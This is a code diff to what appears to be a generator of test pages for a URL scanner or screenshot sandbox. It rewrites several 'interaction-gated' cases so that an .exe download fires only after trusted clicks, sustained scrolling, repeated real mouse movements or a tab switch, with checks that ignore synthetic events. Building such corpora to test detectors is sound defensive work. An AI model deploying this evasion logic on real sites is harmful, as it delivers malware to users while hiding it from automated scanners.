@@ -98,19 +98,25 @@ def build(base):
     # ============================================================
     # B. INTERACTION-GATED — a headless screenshot bot never interacts, so never drops
     # ============================================================
-    add("on-click", BENIGN + '<button onclick="document.getElementById(\'d\').click()">View report</button>' +
-        anchor(),
-        "drops .exe only when the user clicks a button (screenshot bot does not click)")
+    add("on-click", BENIGN + '<button id="b">View report</button>' + anchor() +
+        "<script>document.getElementById('b').addEventListener('click',function(e){"
+        "if(e.isTrusted)document.getElementById('d').click();});</script>",
+        "drops .exe only on a real (trusted) button click")
     add("on-scroll", BENIGN + "<div style='height:3000px'></div>" + anchor() +
-        "<script>addEventListener('scroll',function(){document.getElementById('d').click();},{once:true});</script>",
-        "drops .exe only on scroll")
+        "<script>var s=0,last=0;addEventListener('scroll',function(e){if(!e.isTrusted)return;"
+        "var y=window.scrollY||document.documentElement.scrollTop;if(Math.abs(y-last)>20)s++;last=y;"
+        "if(s>=3&&y>300)document.getElementById('d').click();});</script>",
+        "drops .exe only after real, sustained scrolling (>300px, multiple events)")
     add("on-mousemove", BENIGN + anchor() +
-        "<script>addEventListener('mousemove',function(){document.getElementById('d').click();},{once:true});</script>",
-        "drops .exe only on first mouse movement")
+        "<script>var seen=0,lx=null,ly=null;addEventListener('mousemove',function(e){"
+        "if(!e.isTrusted)return;if(lx!==null&&(Math.abs(e.clientX-lx)+Math.abs(e.clientY-ly))>8)seen++;"
+        "lx=e.clientX;ly=e.clientY;if(seen>=5)document.getElementById('d').click();});</script>",
+        "drops .exe only after ~5 real mouse movements (ignores a single synthetic nudge)")
     add("on-focus", BENIGN + anchor() +
-        "<script>addEventListener('visibilitychange',function(){document.getElementById('d').click();});"
-        "addEventListener('focus',function(){document.getElementById('d').click();});</script>",
-        "drops .exe only on tab focus / visibilitychange")
+        "<script>var wasHidden=false;addEventListener('visibilitychange',function(e){"
+        "if(!e.isTrusted)return;if(document.hidden){wasHidden=true;return;}"
+        "if(wasHidden)document.getElementById('d').click();});</script>",
+        "drops .exe only after a real tab switch away and back (hidden->visible)")
 
     # ============================================================
     # C. CLIENT-SIDE-ONLY PAYLOAD — no fetchable URL for the sandbox; screenshot benign
@@ -139,10 +145,13 @@ def build(base):
         "{document.getElementById('d').click();}</script>",
         "serves benign to headless/bot user-agents; drops .exe otherwise")
     add("cloak-interaction", BENIGN + "<div style='height:2000px'></div>" + anchor() +
-        "<script>var m=false,s=false;addEventListener('mousemove',function(){m=true;f();});"
-        "addEventListener('scroll',function(){s=true;f();});function f(){if(m&&s)"
-        "document.getElementById('d').click();}</script>",
-        "drops .exe only after BOTH real mousemove and scroll (no interaction -> benign)")
+        "<script>var m=0,lx=null,ly=null,sc=false;"
+        "addEventListener('mousemove',function(e){if(!e.isTrusted)return;"
+        "if(lx!==null&&(Math.abs(e.clientX-lx)+Math.abs(e.clientY-ly))>8)m++;lx=e.clientX;ly=e.clientY;f();});"
+        "addEventListener('scroll',function(e){if(!e.isTrusted)return;"
+        "if((window.scrollY||document.documentElement.scrollTop)>300)sc=true;f();});"
+        "function f(){if(m>=5&&sc)document.getElementById('d').click();}</script>",
+        "drops .exe only after BOTH ~5 real mouse moves AND real scrolling")
 
     # ============================================================
     # E. DUAL NATURE — one URL is a viewable benign site AND an .exe dropper / swapper
